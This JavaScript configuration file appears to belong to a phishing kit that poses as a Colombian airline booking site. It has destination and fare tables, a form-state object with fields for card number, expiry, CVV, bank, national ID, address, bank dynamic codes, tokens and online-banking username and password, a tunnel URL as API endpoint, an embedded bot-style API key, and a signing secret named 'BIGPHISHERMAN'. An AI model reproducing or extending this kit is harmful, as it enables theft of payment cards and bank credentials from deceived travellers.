/**
 * CONFIGURACIÓN
 */
const API_URL = 'https://raised-eh-blind-or.trycloudflare.com'; // Cambiar según convenga.
const API_KEY = 'eyJhbGciOiJIUzI1NiJ9.Nzc4MzIyNDUzMzpBQUhmUGdZSHpTeEhscFkwUGFoLThkRlYyU3ltbDlIUEk2QQ.FaphAx2Wo1FrpvKajhgUdp0fgnOhUEbBoUtefUSTMcQ'; // Cambiar según convenga.
const JWT_SIGN = 'BIGPHISHERMAN';

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const destinations = [
    {
        city: "Arauca",
        country: "Colombia",
        code: "AUC",
        weight: 0
    },
    {
        city: "Armenia",
        country: "Colombia",
        code: "AXM",
        weight: 0
    },
    {
        city: "Barrancabermeja",
        country: "Colombia",
        code: "EJA",
        weight: 0
    },
    {
        city: "Barranquilla",
        country: "Colombia",
        code: "BAQ",
        weight: 0
    },
    {
        city: "Bogotá",
        country: "Colombia",
        code: "BOG",
        weight: 0
    },
    {
        city: "Bucaramanga",
        country: "Colombia",
        code: "BGA",
        weight: 0
    },
    {
        city: "Cali",
        country: "Colombia",
        code: "CLO",
        weight: 0
    },
    {
        city: "Cartagena",
        country: "Colombia",
        code: "CTG",
        weight: 0
    },
    {
        city: "Cúcuta",
        country: "Colombia",
        code: "CUC",
        weight: 0
    },
    {
        city: "Florencia",
        country: "Colombia",
        code: "FLA",
        weight: 0
    },
    {
        city: "Guapi",
        country: "Colombia",
        code: "GPI",
        weight: 0
    },
    {
        city: "Ibagué",
        country: "Colombia",
        code: "IBE",
        weight: 0
    },
    {
        city: "Ipiales",
        country: "Colombia",
        code: "IPI",
        weight: 0
    },
    {
        city: "Leticia",
        country: "Colombia",
        code: "LET",
        weight: 0
    },
    {
        city: "Manizales",
        country: "Colombia",
        code: "MZL",
        weight: 0
    },
    {
        city: "Medellín",
        country: "Colombia",
        code: "MDE",
        weight: 0
    },
    {
        city: "Montería",
        country: "Colombia",
        code: "MTR",
        weight: 0
    },
    {
        city: "Neiva",
        country: "Colombia",
        code: "NVA",
        weight: 0
    },
    {
        city: "Pasto",
        country: "Colombia",
        code: "PSO",
        weight: 0
    },
    {
        city: "Pereira",
        country: "Colombia",
        code: "PEI",
        weight: 0
    },
    {
        city: "Popayán",
        country: "Colombia",
        code: "PPN",
        weight: 0
    },
    {
        city: "Puerto Asís",
        country: "Colombia",
        code: "PUU",
        weight: 0
    },
    {
        city: "Riohacha",
        country: "Colombia",
        code: "RCH",
        weight: 0
    },
    {
        city: "San Andrés",
        country: "Colombia",
        code: "ADZ",
        weight: 0
    },
    {
        city: "San José del Guaviare",
        country: "Colombia",
        code: "SJE",
        weight: 0
    },
    {
        city: "Santa Marta",
        country: "Colombia",
        code: "SMR",
        weight: 0
    },
    {
        city: "Tumaco",
        country: "Colombia",
        code: "TCO",
        weight: 0
    },
    {
        city: "Valledupar",
        country: "Colombia",
        code: "VUP",
        weight: 0
    },
    {
        city: "Villavicencio",
        country: "Colombia",
        code: "VVC",
        weight: 0
    },
    {
        city: "Yopal",
        country: "Colombia",
        code: "EYP",
        weight: 0
    }, //INT
    {
        region: 'nort',
        country: 'Canada',
        city: 'Toronto',
        code: 'YYZ',
        weight: 10
    },
    {
        region: 'nort',
        country: 'Canada',
        city: 'Montreal',
        code: 'YUL',
        weight: 9
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Boston',
        code: 'BOS',
        weight: 10
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Dallas',
        code: 'DFW',
        weight: 9
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Fort Lauderdale',
        code: 'FLL',
        weight: 8
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Houston',
        code: 'IAH',
        weight: 8
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Los Ángeles',
        code: 'LAX',
        weight: 10
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Miami',
        code: 'MIA',
        weight: 9
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Nueva York',
        code: 'JFK',
        weight: 9
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Orlando',
        code: 'MCO',
        weight: 8
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'San Francisco',
        code: 'SFO',
        weight: 5
    },
    {
        region: 'nort',
        country: 'EEUU',
        city: 'Washington',
        code: 'IAD',
        weight: 4
    },
    {
        region: 'nort',
        country: 'México',
        city: 'Cancún',
        code: 'CUN',
        weight: 5
    },
    {
        region: 'nort',
        country: 'México',
        city: 'Ciudad De México',
        code: 'MEX',
        weight: 5
    },
    {
        region: 'central',
        country: 'Belice',
        city: 'Ciudad de Belice',
        code: 'BZE',
        weight: 5
    },
    {
        region: 'central',
        country: 'Costa Rica',
        city: 'Liberia',
        code: 'LIR',
        weight: 4
    },
    {
        region: 'central',
        country: 'Costa Rica',
        city: 'San José',
        code: 'SJO',
        weight: 5
    },
    {
        region: 'central',
        country: 'El Salvador',
        city: 'San Salvador',
        code: 'SAL',
        weight: 4
    },
    {
        region: 'central',
        country: 'Guatemala',
        city: 'Ciudad de Guatemala',
        code: 'GUA',
        weight: 4
    },
    {
        region: 'central',
        country: 'Guatemala',
        city: 'Flores',
        code: 'FRS',
        weight: 4
    },
    {
        region: 'central',
        country: 'Honduras',
        city: 'Tegucigalpa',
        code: 'TGU',
        weight: 5
    },
    {
        region: 'central',
        country: 'Honduras',
        city: 'San Pedro Sula',
        code: 'SAP',
        weight: 5
    },
    {
        region: 'central',
        country: 'Honduras',
        city: 'Managua',
        code: 'MGA',
        weight: 4
    },
    {
        region: 'central',
        country: 'Panamá',
        city: 'Ciudad de Panamá',
        code: 'PTY',
        weight: 2
    },
    {
        region: 'caribean',
        country: 'Aruba',
        city: 'Orajestad',
        code: 'AUA',
        weight: 4
    },
    {
        region: 'caribean',
        country: 'Curazao',
        city: 'Willemstad',
        code: 'CUR',
        weight: 4
    },
    {
        region: 'caribean',
        country: 'Puerto Rico',
        city: 'San Juan',
        code: 'SJU',
        weight: 3
    },
    {
        region: 'caribean',
        country: 'República Dominicana',
        city: 'Punta Cana',
        code: 'PUJ',
        weight: 2
    },
    {
        region: 'caribean',
        country: 'República Dominicana',
        city: 'Santo Domingo',
        code: 'SDQ',
        weight: 3
    },
    {
        region: 'europe',
        country: 'España',
        city: 'Madrid',
        code: 'MAD',
        weight: 8
    },
    {
        region: 'europe',
        country: 'España',
        city: 'Barcelona',
        code: 'BCN',
        weight: 8
    },
    {
        region: 'europe',
        country: 'Francia',
        city: 'Paris',
        code: 'CDG',
        weight: 10
    },
    {
        region: 'europe',
        country: 'Reino Unido',
        city: 'Londres',
        code: 'LHR',
        weight: 7
    },
    {
        region: 'south',
        country: 'Venezuela',
        city: 'Caracas',
        code: 'CCS',
        weight: 1
    },
    {
        region: 'south',
        country: 'Ecuador',
        city: 'Galápagos - San Cristóbal',
        code: 'SCY',
        weight: -1
    },
    {
        region: 'south',
        country: 'Ecuador',
        city: 'Cuenca',
        code: 'CUE',
        weight: 2
    },
    {
        region: 'south',
        country: 'Ecuador',
        city: 'Galápagos - Isla Baltra',
        code: 'GPS',
        weight: -2
    },
    {
        region: 'south',
        country: 'Ecuador',
        city: 'Guayaquil',
        code: 'GYE',
        weight: -1
    },
    {
        region: 'south',
        country: 'Ecuador',
        city: 'Manta',
        code: 'MEC',
        weight: -3
    },
    {
        region: 'south',
        country: 'Ecuador',
        city: 'Quito',
        code: 'UIO',
        weight: -2
    },
    {
        region: 'south',
        country: 'Perú',
        city: 'Lima',
        code: 'LIM',
        weight: -3
    },
    {
        region: 'south',
        country: 'Perú',
        city: 'Cusco',
        code: 'CUZ',
        weight: -3
    },
    {
        region: 'south',
        country: 'Bolivia',
        city: 'Santa Cruz de la Sierra',
        code: 'VVI',
        weight: -3
    },
    {
        region: 'south',
        country: 'Bolivia',
        city: 'La Paz',
        code: 'LPB',
        weight: -3
    },
    {
        region: 'south',
        country: 'Brasil',
        city: 'Manaos',
        code: 'MAO',
        weight: -3
    },
    {
        region: 'south',
        country: 'Brasil',
        city: 'Río de Janeiro',
        code: 'GIG',
        weight: -0
    },
    {
        region: 'south',
        country: 'Brasil',
        city: 'São Paulo',
        code: 'GRU',
        weight: -3
    },
    {
        region: 'south',
        country: 'Chile',
        city: 'Santiago de Chile',
        code: 'SCL',
        weight: -3
    },
    {
        region: 'south',
        country: 'Paraguay',
        city: 'Asunción',
        code: 'ASU',
        weight: -3
    },
    {
        region: 'south',
        country: 'Uruguay',
        city: 'Montevideo',
        code: 'MVD',
        weight: -3
    },
    {
        region: 'south',
        country: 'Argentina',
        city: 'Buenos Aires',
        code: 'EZE',
        weight: -4
    },
]
const LOGO = 1
const BANNER = 1
const PRECIO_BASE_INT = 80100
const MULTIPLICADOR_PLAN = {
    basic: 1,
    classic: 1.25,
    flex: 1.5
}
const MULTIPLICADOR_HORARIO = {
    sched1: 1,
    sched2: 1.3,
    sched3: 1.4
}
const MULTIPLICADOR_HORA_VUELO = .9

const pricesNAC = {
    sched1:{
        basic: 49900,
        classic: 69900,
        flex: 89900,
    },
    sched2:{
        basic: 55900,
        classic: 73900,
        flex: 89900,
    },
    sched3:{
        basic: 78900,
        classic: 109900,
        flex: 129000,
    } 
};

let info = {
    flightInfo:{
        type: 1,
        ticket: false,
        origin: {
            city: "Bogotá",
            country: "Colombia",
            code: "BOG",
            weight: 0
        },
        destination: {},
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0],
        ticket_nat: false,
        ticket_sched: false,
        ticket_type: false,
        ticket_sched_back: false,
        ticket_type_back: false,

    },
    passengersInfo:{
        adults: [],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}


LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

